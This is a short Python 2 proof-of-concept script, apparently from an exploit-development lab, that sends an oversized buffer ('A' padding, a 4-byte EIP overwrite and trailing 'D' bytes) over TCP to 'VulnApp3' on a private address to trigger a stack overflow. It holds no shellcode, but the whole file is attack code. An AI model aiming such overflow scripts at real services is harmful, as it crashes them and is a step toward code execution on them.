#!/usr/bin/python
import socket
import time

print "[*] Strating buffer overflow attack against VulnApp3: poc-4"
time.sleep(1)
print "[*] Setup the buffer"
payload = "A" * 2080
EIP = "B" * 4
offset = "D" * 116

mybuffer = payload + EIP + offset
try:

  print "[*] Buffer size is: " + str(len(mybuffer))
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.128.10", 7003))
  s.send(mybuffer)
  s.close()

  print "[*] Flowding finish!"
  time.sleep(1)
except:
  print "[*] Error occur could not connect!"


